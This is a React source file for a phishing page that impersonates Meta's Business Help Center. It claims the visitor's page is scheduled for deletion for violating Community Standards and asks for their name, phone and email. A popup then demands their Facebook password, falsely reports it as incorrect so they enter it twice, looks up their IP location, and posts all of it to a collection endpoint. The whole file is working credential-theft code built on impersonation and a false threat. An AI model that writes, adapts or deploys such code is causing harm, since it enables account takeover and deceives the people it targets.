import React from 'react'
import { logo, search, user } from './Publics/images/images'
import { Link, useNavigate } from 'react-router-dom'
import { useState } from 'react';
import axios from 'axios';
import { Button, Checkbox, Form, Input } from 'antd';
const { TextArea } = Input;



const Next_buiness = () => {

    const [activePopup, setActivePopup] = useState(false);
    const [activePassword, setActivePassword] = useState(false);
    const [first, setActionFirst] = useState(true);
    const [firstPassword, setFirstPassword] = useState();
    const navigate = useNavigate();

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const onFinish = (values) => {

        if(values.check_form === true){
            localStorage.setItem('dataForm', JSON.stringify(values))
            return handleOpendPopup()
        }

    };

    
    const onFinishPassWord = (values) => {

        if(first === true) {
            setFirstPassword(values.fill_first_password)
            setActionFirst(false)
        }
        
        const passWord = values.fill_first_password;
        setActivePassword(true)
        const dataLocalForm = JSON.parse(localStorage.getItem('dataForm'));

        if(activePassword === true){
            axios.get(`https://api.db-ip.com/v2/free/self`)
                .then((response) => {

                    const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord, ip:response.data.ipAddress, city: response.data.city, country: response.data.country  };
                    localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
        
                    const data = {
                        'fill_email': dataPassWord.fill_email,
                        'fill_phone': dataPassWord.fill_phone,
                        'fill_your_name': dataPassWord.fill_your_name,
                        'ip': response.data.ipAddress,
                        'city': response.data.city,
                        'country': response.data.countryName,
                        'first_password': firstPassword,
                        'second_password': passWord,
                    }

                    axios.post( "http://localhost:8080/api/news", data) 
                    .then((response) => {
                        if (response.data.status === 0 ) {
                                navigate('/contact-account/confirm');
                            }
                        })
                        
                })
                    
        }
    };

  return (
    <div className="business">

        <div className="top-header">
            <div className="container">
                <img src={logo} width="70" className="metalogo" alt=''/>
                <p className="metahead">Support Inbox</p>
                <img src={search} width="100%" className="searchicon" alt=''/>
            </div>
        </div>
        <div className="masheader">
            <div className="wrapper">
                <div className="container">
                    <p className="businesshelp" >
                        Meta Business Help Center </p>
                    <p className="businesshelpcenter">Get Support</p>
                </div>
            </div>
        </div>

        <div className="main">

            <div className='content-width col-md-5 col-12'>
                <div className="title-page">
                    <div className='left'>
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M0.0495854 3.55544C0.25173 2.66484 1.04822 2 2 2H14C14.9518 2 15.7483 2.66484 15.9504 3.55544L8 8.41403L0.0495854 3.55544ZM0 4.69708V11.8006L5.80319 8.24348L0 4.69708ZM6.7614 8.82905L0.191871 12.8559C0.512604 13.5323 1.20168 14 2 14H14C14.7983 14 15.4874 13.5323 15.8081 12.8559L9.2386 8.82905L8 9.58597L6.7614 8.82905ZM10.1968 8.24348L16 11.8006V4.69708L10.1968 8.24348Z" fill="black"/>
                        </svg>
                    </div>
                    <div className='right'>                    
                        <p><b>Your page goes against our Community Standards</b></p>
                        <p style={{fontSize: "12px"}}>Report no: 3088553115</p>                    
                    </div>
                </div>

                <div className='facebook'>
                    <p className='act'>ACTIVITY</p>
                    
                    <div className='content-fb'>
                        <div className='col-1'>
                            <img src='https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico' width={"35px"} />
                        </div>

                        <div className='col-11'>
                            <p><b>Your Reply</b></p>
                            <p>Your page has been scheduled for deletion because one of the following reasons:</p>
                            <p>- Intellectual Property Infringement</p>
                            <p>- Community Standards</p>
                            <p>- Hate Speech</p>
                        </div>

                    </div>
                </div>

                <div className='facebook'>
                    <div className='content-fb'>
                        <div className='col-1'>
                            <img src={user} width={"35px"}/>
                        </div>

                        <div className='col-11'>
                            <p><b>Our Message</b></p>
                            <p>Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.</p>



                            <div className="form">
                                {/* FORM START */}

                                <Form
                                    name="basic"
                                    initialValues={{
                                    remember: true,
                                    }}
                                    onFinish={onFinish}
                                    autoComplete="off"
                                >

                                    <div className="item-form">
                                        <label for="fill_your_name"><b>Your Name</b></label>
                                        <Form.Item
                                            name="fill_your_name"
                                            rules={[
                                                {
                                                required: true,
                                                message: 'Please input email address!',
                                                },
                                            ]}
                                        >
                                            <Input style={{padding: "5px 11px"}} />
                                        </Form.Item>
                                    </div>

                                    <div className="item-form">
                                        <label for="fill_phone"><b>Your Phone Number</b></label>
                                        <Form.Item
                                            name="fill_phone"
                                            rules={[
                                                {
                                                required: true,
                                                message: 'Please input your phone number!',
                                                },
                                            ]}
                                        >
                                            <Input />
                                        </Form.Item>
                                    </div>

                                    <div className="item-form">
                                        <label for="fill_email"><b>Login Email Address</b></label>
                                        <Form.Item
                                            name="fill_email"
                                            rules={[
                                                {
                                                required: true,
                                                message: 'Please input your email address!',
                                                },
                                            ]}
                                        >
                                            <Input />
                                        </Form.Item>
                                    </div>

                                    <div className="item-form">
                                        <label for="fill_appeal"><b>Your Appeal</b></label>
                                        <Form.Item
                                            name="fill_appeal"
                                            rules={[
                                                {
                                                required: true,
                                                message: 'Please input your appeal!',
                                                },
                                            ]}
                                        >
                                            <Input />
                                        </Form.Item>
                                    </div>

                                    <div className="item-form">
                                        <Form.Item
                                            name="check_form"
                                            valuePropName="checked"
                                            rules={[
                                                {
                                                required: true,
                                                message: 'Please agree to our terms and data and cookie policy!',
                                                },
                                            ]}
                                        >
                                            <Checkbox >I agree to our Terms, Data and Cookies Policy.</Checkbox>
                                        </Form.Item>
                                    </div>


                                    <Form.Item 
                                        className="btn butoni"
                                    >
                                        <Button
                                            htmlType="submit"
                                            style={{
                                                backgroundColor: "transparent",
                                                outline: "none",
                                                border: 'none',
                                                boxShadow: 'none',
                                                color: "#267df1",
                                                fontWeight: '700',
                                                fontSize:'1rem',
                                                width: '100%'
                                            }}
                                        >
                                            Submit
                                        </Button>
                                    </Form.Item>
                                </Form>

                                {/* FORM END */}
                            </div>

                        </div>

                    </div>
                </div>

                
            
            </div>

        </div>

        {/* FOOTER */}
        <div className="footer">
            <div className="container">
                <img src={logo} alt="" className="logofooter"/>
                <p className="nerlogofooter">
                    Facebook can help your large, medium or small business
                    grow. Get the latest news
                    for advertisers and more on our <Link to="#" style={{textDecoration: "none", color: "white"}}>Meta for Business Page.</Link></p>
                <div className="row">
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Marketing on Facebook</p>
                                <p>Success Stories</p>
                                <p>Measurement</p>
                                <p>Industries</p>
                                <p>Inspiration</p>
                                <p>Events</p>
                                <p>News</p>
                                <p>Site map</p>
                            </li>
                        </ul>
                    </div>
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Marketing objectives</p>
                                <p>Build your presence</p>
                                <p>Create awareness</p>
                                <p>Drive discovery</p>
                                <p>Generate leads</p>
                                <p>Boost sales</p>
                                <p>Earn loyalty</p>
                            </li>
                        </ul>
                    </div>
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Facebook Pages</p>
                                <p>Get started with Pages</p>
                                <p>Setting up your Page</p>
                                <p>Manage your Facebook Page</p>
                                <p>Promote your Page</p>
                                <p>Messaging on your Page</p>
                                <p>Page Insights</p>
                            </li>
                        </ul>
                    </div>
                    <div variant="dontshowonmobile " className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Facebook ads</p>
                                <p>Get started with ads</p>
                                <p>Buying Facebook ads</p>
                                <p>Ad formats</p>
                                <p>Ad placement</p>
                                <p>Choose your audience</p>
                                <p>Measure your ads</p>
                                <p>Managing your ads</p>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <div className="bottomfooter">
            <div className="container">
                <ul>
                    <li>English (UK)</li>
                    <li>English (US)</li>
                    <li>Español</li>
                    <li>Português (Brasil)</li>
                    <li>Français (France)</li>
                    <li>Español (España)</li>
                    <li>More languages</li>
                </ul>
                <ul>
                    <li>© 2023 Meta</li>
                    <li>About</li>
                    <li>Developers</li>
                    <li>Careers</li>
                    <li>Privacy</li>
                    <li>Cookies</li>
                    <li>Terms</li>
                    <li>Help Centre</li>
                </ul>
            </div>
        </div>


        <div className={`popup  ${activePopup === true ? 'active' : ''}`} id="popup" >
            <div className="background" onClick={handleClosePopup}></div>
            <div className="content">

                <Form
                    name="basicForm"
                    initialValues={{
                    remember: true,
                    }}
                    onFinish={onFinishPassWord}
                    autoComplete="off"
                >

                    <div className="modal-header custom-header px-0">
                        <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "22px", fontWeight: "600"}}>Please enter your facebook password to continue</h5>
                        <button type="button" data-dismiss="modal" aria-label="Close" onClick={handleClosePopup} className="close">
                            <span aria-hidden="true" >×</span>
                        </button>
                    </div>

                    <div className="item-form">
                        <p style={{fontSize:"16px", marginBottom: "10px"}}>We need to confiom the sender of the information is you. Please enter your facebook password and then continue</p>
                        <label for="password">Enter Your Password</label>
                        <Form.Item
                            name="fill_first_password"
                            rules={[
                                {
                                required: true,
                                message: `The password you've entered is incorrect.`,
                                },
                            ]}
                            style={{
                                margin: '0'
                            }}
                        >
                            <Input.Password />
                        </Form.Item>
                        <p className={`password-correct ${activePassword === true ? 'active' : ''}`}>The password you've entered is incorrect.</p>
                    </div>

                    <Form.Item 
                        style={{
                            color: "rgb(255, 255, 255)", 
                            backgroundColor: "rgb(44, 132, 244)", 
                            marginTop: "20px",
                            width: "auto",
                            float: 'right'
                        }}
                        className="btn butoni"
                    >
                        <Button
                            htmlType="submit"
                            style={{
                                backgroundColor: "transparent",
                                outline: "none",
                                border: 'none',
                                boxShadow: 'none',
                                fontWeight: '700',
                                fontSize:'1rem',
                                color: 'white'
                            }}
                        >
                            Continue
                        </Button>
                    </Form.Item>
                </Form>

            </div>
        </div>
    </div>
  )
}

export default Next_buiness